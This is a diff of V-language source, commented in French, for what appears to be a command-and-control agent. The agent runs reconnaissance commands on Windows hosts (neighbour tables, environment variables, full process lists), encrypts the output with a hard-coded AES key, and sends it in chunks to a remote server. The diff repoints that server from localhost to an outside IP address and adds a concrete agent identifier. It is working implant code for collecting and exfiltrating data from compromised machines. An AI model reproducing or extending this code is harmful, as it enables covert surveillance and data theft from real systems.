@@ -39,7 +39,7 @@ struct Response{
 }
 
 struct SharedVariable {
-	agent_identifier string = "<id-agent>" // de la forme "agent-x" ou x est le numèro de l'agent
+	agent_identifier string = "b8WBladqhtmn" // de la forme "agent-x" ou x est le numèro de l'agent
 	cryptkey []u8 = [u8(58), 140, 235, 100, 85, 188, 29, 129, 132, 36, 177, 236, 124, 169, 4, 175, 89, 170, 88, 188, 201, 63, 59, 248, 110, 119, 237, 167, 81, 146, 200, 224] // la clé de chiffrement pour le module d'écoute ou d'envoi
 	iv []u8 = [u8(116), 29, 251, 88, 134, 70, 51, 219, 159, 174, 205, 64, 142, 107, 136, 74] // le vecteur d'initialisation pour le chiffrement aes-256-cbc
 
@@ -55,12 +55,6 @@ struct SharedVariable {
 		Commande{command: 'netsh interface ipv4 show neighbors', type_shell: ShellType.powershell, id: "NEIGHBORS"},
 		Commande{command: 'set', type_shell: ShellType.cmd, id: "VARENV"},
 		Commande{command: 'wmic process list full', type_shell: ShellType.cmd, id: "PROCESSHARD"},
-		Commande{command: 'wmic process list full', type_shell: ShellType.cmd, id: "PROCESSHARD"},
-		Commande{command: 'wmic process list full', type_shell: ShellType.cmd, id: "PROCESSHARD"},
-		Commande{command: 'wmic process list full', type_shell: ShellType.cmd, id: "PROCESSHARD"},
-		Commande{command: 'wmic process list full', type_shell: ShellType.cmd, id: "PROCESSHARD"},
-		
-		
 	]
 mut:
 	execution_commande_list []int
@@ -80,6 +74,48 @@ fn (shared sv SharedVariable) set_module_state(mod Module,state ModuleState, des
 fn main(){
 	shared shared_variable := SharedVariable{}
 	shared_variable.module_ecoute()
+	sw := time.new_stopwatch()
+	shared_variable.module_ecoute()
+	rlock shared_variable {
+		println("\n[[[[ MODULE STATUS ]]]]")
+		println(show_all_module_status(shared_variable))
+
+		println("\n[[[ SHARED VARIABLES ]]]")
+		//dump_shared_variable(shared_variable)
+	}
+		println("[i] - fin d'éxecution. Temps d'énumeration  ${sw.elapsed().seconds()}")
+}
+
+fn dump_shared_variable(sv &SharedVariable){
+	println("=======================-[Dump des shared variables]-=======================")
+		println("	identifiant de l'agent : ${sv.agent_identifier}")
+		for c in sv.commandes_list	{
+			println("${c}")
+		}
+		println("	list d'execution : ${sv.execution_commande_list}")
+		println("	ip : ${sv.ip}")
+		rlock sv.response_list {
+			println("	response_list : ${sv.response_list}")
+		}
+		rlock sv.module_state {
+			println("	module state be like : ${sv.module_state}")
+		}
+}
+
+fn show_all_module_status(sv &SharedVariable) string {
+	mut rst := '\n'
+	unsafe {
+		for i in 0..sv.number_of_module {
+			rst += '==== Module ' + Module(i).str() + ' :\n'
+			rlock sv.module_state, sv.module_state_description {
+				rst += ' - status : ' + sv.module_state[i].str() + '\n'
+				rst += ' - description : ' + sv.module_state_description[i] + '\n'
+			}
+			rst += '\n'
+		}
+	}
+
+	return rst
 }
 
 // ------------------------------------------------------------------------- fonction nécessaire en cas d'utilisation de socket
@@ -182,7 +218,7 @@ fn authentification(ip string,key []u8, iv []u8, agent_id string,typeCommunicati
 // ------------------------------------------------------------------------- Module écoute
 fn (shared sv SharedVariable) module_ecoute(){
 	sv.set_module_state(Module.ecoute, ModuleState.running, "listening module running.")
-	println("Début du module d'envoie !")
+	println("[i] - Début du module d'envoie !")
 
 	// on s'authentifie
 	mut key := []u8{len: 32}
@@ -196,7 +232,7 @@ fn (shared sv SharedVariable) module_ecoute(){
 	}
 
 	// On s'authentifie au près du serveur
-	mut sock := authentification("127.0.0.1:8080",key,iv,agent_id,"COMMAND") or {
+	mut sock := authentification("14.20.22.200:8080",key,iv,agent_id,"COMMAND") or {
 		sv.set_module_state(Module.ecoute,ModuleState.error,"Error - socket authentication for report failed.")
 		return
 	}
@@ -288,7 +324,7 @@ fn (shared sv SharedVariable) module_ecoute(){
 
 // ------------------------------------------------------------------------- Module exécution
 fn (shared sv SharedVariable) module_execution() {
-	println("Début du module d'exécution !")
+	println("[i] - Début du module d'exécution !")
     lock sv.module_state {
         sv.module_state[Module.execution] = ModuleState.running
     }
@@ -320,11 +356,12 @@ fn (shared sv SharedVariable) module_execution() {
     lock sv.module_state {
         sv.module_state[Module.execution] = ModuleState.finish
     }
+	println("[i] - Fin du module d'exécution !")
 }
 
 // ------------------------------------------------------------------------- Module envoie
 fn (shared sv SharedVariable) module_envoie() {
-	println("Début du module d'envoie !")
+	println("[i] - Début du module d'envoie !")
 	sv.set_module_state(Module.envoie,ModuleState.started,"starting...")
 
 	// On récupère clé de chiffrement
@@ -338,18 +375,22 @@ fn (shared sv SharedVariable) module_envoie() {
 		agent_id = sv.agent_identifier
 	}
 
+	println("[i] - envoie - authentification...")
 	// On s'authentifie au près du serveur
-	mut sock := authentification("127.0.0.1:8080",key,iv,agent_id,"REPORT") or {
+	mut sock := authentification("14.20.22.200:8080",key,iv,agent_id,"REPORT") or {
 		sv.set_module_state(Module.envoie,ModuleState.error,"Error - socket authentication for report failed.")
 		return
 	}
 
+	sock.set_read_timeout(1 * time.minute)
+
+	println("[i] - envoie - waiting for READY...")
 	mut retour := ''
 	if !read_encrypt_message(mut retour, key, iv, mut sock) {
 		sv.set_module_state(Module.envoie,ModuleState.error,"Error - socket failure when waiting for 'READY'.")
 		return
 	}
-
+	println("[i] - envoie - reçu : " + retour)
 	if retour != 'READY' {
 		sv.set_module_state(Module.envoie, ModuleState.error, "Error - Bad protocol or decryption, stoping report.")
 		return
@@ -358,8 +399,8 @@ fn (shared sv SharedVariable) module_envoie() {
 	mut index := 0 // l'index correspondant à la command ou il en est
 
 	// on attend que le module d'éxecution est running
-	mut s := ModuleState.unknown
-
+	/*mut s := ModuleState.unknown
+	println("[i] - Début de l'algorithme de rapport")
 	for {
 		
 		rlock sv.module_state {
@@ -373,7 +414,7 @@ fn (shared sv SharedVariable) module_envoie() {
 		println('waiting module... ' + s.str())
 
 		time.sleep(10 * time.millisecond)
-	}
+	}*/
 
 	// on attend qu'une commande soit ajouté
 	for {
@@ -388,6 +429,7 @@ fn (shared sv SharedVariable) module_envoie() {
 		time.sleep(10 * time.millisecond)
 	}
 
+	println("[i] - Début de transmission des response.")
 	mut response := Response{}
 	mut header := ""
 	mut full_response := ""
@@ -408,7 +450,7 @@ fn (shared sv SharedVariable) module_envoie() {
 		full_response = header + response.output + "\n"
 
 		// on calcule avec un % 9082 pour voir combien de paquet il faudra envoyer
-		size_chunk = 9070
+		size_chunk = 1100
 
 		chunks = []string{}
 		
@@ -480,4 +522,5 @@ fn (shared sv SharedVariable) module_envoie() {
 	}
 
 	sv.set_module_state(Module.envoie,ModuleState.finish,"task completed.")
+	println("[i] - Fin de l'algorithme de rapport !")
 }
